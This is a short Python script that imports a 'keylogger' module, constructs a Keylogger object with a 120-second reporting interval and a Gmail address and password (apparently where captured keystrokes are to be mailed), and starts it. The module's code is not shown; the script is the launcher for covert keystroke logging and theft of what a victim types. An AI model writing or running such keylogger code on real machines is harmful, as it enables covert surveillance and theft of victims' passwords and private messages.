#!/usr/bin/env python

import keylogger

my_keylogger = keylogger.Keylogger(120, "mymail@gmail.com", "mypassword")
my_keylogger.start()